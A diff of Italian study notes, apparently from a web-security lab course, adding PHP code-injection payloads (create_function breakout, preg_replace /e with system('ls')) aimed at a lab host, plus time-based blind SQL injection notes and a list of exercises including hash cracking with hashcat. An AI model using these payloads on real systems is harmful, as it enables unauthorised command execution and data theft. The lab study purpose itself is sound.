@@ -597,7 +597,7 @@ name = hacker"
      + "
 ```
 
-`/codeexec/example1.php?name=hacker%22;system(%22id%22);%22`
+`/codeexec/example1.php?name=hacker";system("id");"`
 
 
 **Mitigazioni**:
@@ -605,8 +605,29 @@ name = hacker"
 - Rimuovere la stampa di stderr cambiando il file di configurazione php 
 
 
+## Code Injection 2: 
+
+La vulnerabilità sta nell'uso di `create_function()` nel codice sorgente PHP, che ha l'obiettivo di creare dinamicamente una funzione di ordinamento basata sull'input utente, l'input non viene sanificato e questo permette di chiudere la funzione prematuramente e iniettare comandi arbitrari.  
+
+L'exploit da inserire nell'url è il seguente:
+
+```
+/codeexec/example2.php?order=name);}system('ls');//
+```
+
+- la prima parentesi tonda chiude i parametri e la graffa chiude la funzione permettendo di iniettare codie arbitrario, successivamente si commenta il resto del codice per evitare che il PHP si rompa.  
 
 
+
+## Code Injection 3:
+
+La vulnerabilità consiste nell'usare `preg_replace`, si riporta l'url per fare la code injection:  
+
+```
+http://192.168.64.6/codeexec/example3.php?new=system(%22ls%22)&pattern=/lamer/e&base=Hello%20lamer
+```
+
+nota: non dovrebbe chiederlo  
 
 
 ## SQL Injection 1:
@@ -804,13 +825,26 @@ name` OR IF (ASCII(SUBSTRING(DATABASE(), 2, 1,)) > NN, SLEEP(1), 1)%23
 
 
 Andando avanti in questo modo e sfruttando al ricerca binaria riusciamo ad estrarre il nome del database abbastanza in fretta, ricorda che se la condizione IF viene valutata positiva allora si ha il timeout, altrimenti non si ha nessun timeout. 
+Ricorda che in caso la query ritorni `TRUE` allora verrà eseguito lo sleep() e la pagina caricherà con un certo ritardo, se la query ritorna `FALSE` allora non verrà invocato lo sleep e la pagina caricherà immediatamente.  
 
 
 
 
+
+
+
+
+Altri esercizi:
+- code injection 1,2,3,4
+- comand injection 1,2,3
+- XSS 1,2,3
+- sql inj 1,2,3,8
+- file include 1,2
 
 
 domande:
 - esercizio 5 (decomprimere archivio e utilizzarne contenuto)
 - esercizio 6 - hash salvato in chiaro, usare hashcat e rockyou come dizionario 
 - esercizio 8 - serve wireshark 
+- dash e bash ??
+
